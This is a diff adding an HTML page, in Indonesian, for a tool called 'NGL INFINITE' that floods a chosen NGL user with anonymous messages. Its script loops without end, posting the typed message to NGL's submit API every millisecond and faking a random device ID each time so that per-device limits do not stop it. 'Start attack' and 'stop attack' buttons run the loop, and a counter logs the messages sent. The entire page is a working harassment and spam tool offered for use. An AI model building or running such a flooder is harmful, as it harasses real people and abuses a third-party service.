@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>XYZ DRAGON - INFINITE NGL</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap');
+        body { background: #000; color: #ff0055; font-family: 'JetBrains Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 400px; border: 2px solid #ff0055; padding: 25px; background: #050505; box-shadow: 0 0 30px rgba(255, 0, 85, 0.3); border-radius: 10px; }
+        h2 { text-align: center; letter-spacing: 3px; margin-bottom: 20px; text-shadow: 0 0 10px #ff0055; }
+        input, textarea { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #ff0055; color: #fff; border-radius: 5px; outline: none; box-sizing: border-box; }
+        .btn-attack { width: 100%; padding: 15px; background: #ff0055; border: none; color: #fff; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .btn-stop { width: 100%; padding: 15px; background: #fff; border: none; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; display: none; text-transform: uppercase; }
+        #log { height: 100px; overflow-y: auto; font-size: 10px; color: #00ff00; margin-top: 15px; border-top: 1px solid #222; padding-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>🐉 NGL INFINITE</h2>
+    <input type="text" id="target" placeholder="TARGET USERNAME">
+    <textarea id="message" rows="3" placeholder="PESAN SPAM..."></textarea>
+    
+    <button id="startBtn" class="btn-attack" onclick="initiate()">START ATTACK</button>
+    <button id="stopBtn" class="btn-stop" onclick="stop()">STOP ATTACK</button>
+
+    <div id="log">> STANDBY...</div>
+</div>
+
+<script>
+    let isAttacking = false;
+    let sentCount = 0;
+
+    function addLog(t) {
+        const log = document.getElementById('log');
+        log.innerHTML = `[${new Date().toLocaleTimeString()}] ${t}<br>` + log.innerHTML;
+    }
+
+    async function initiate() {
+        const user = document.getElementById('target').value;
+        const msg = document.getElementById('message').value;
+
+        if(!user || !msg) return alert("Usn & Pesan jangan kosong, King!");
+
+        isAttacking = true;
+        sentCount = 0;
+        document.getElementById('startBtn').style.display = 'none';
+        document.getElementById('stopBtn').style.display = 'block';
+        addLog("INITIATING INFINITE ATTACK...");
+
+        while(isAttacking) {
+            // Turbo Send 1ms
+            fetch("https://ngl.link/api/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
+                body: `username=${encodeURIComponent(user)}&question=${encodeURIComponent(msg)}&deviceId=${Math.random().toString(36).substring(7)}`
+            }).catch(() => {});
+
+            sentCount++;
+            if(sentCount % 10 === 0) {
+                addLog(`SENT: ${sentCount} MESSAGES`);
+            }
+
+            // Delay 1ms
+            await new Promise(r => setTimeout(r, 1));
+        }
+    }
+
+    function stop() {
+        isAttacking = false;
+        document.getElementById('startBtn').style.display = 'block';
+        document.getElementById('stopBtn').style.display = 'none';
+        addLog("ATTACK HALTED.");
+    }
+</script>
+
+</body>
+</html>
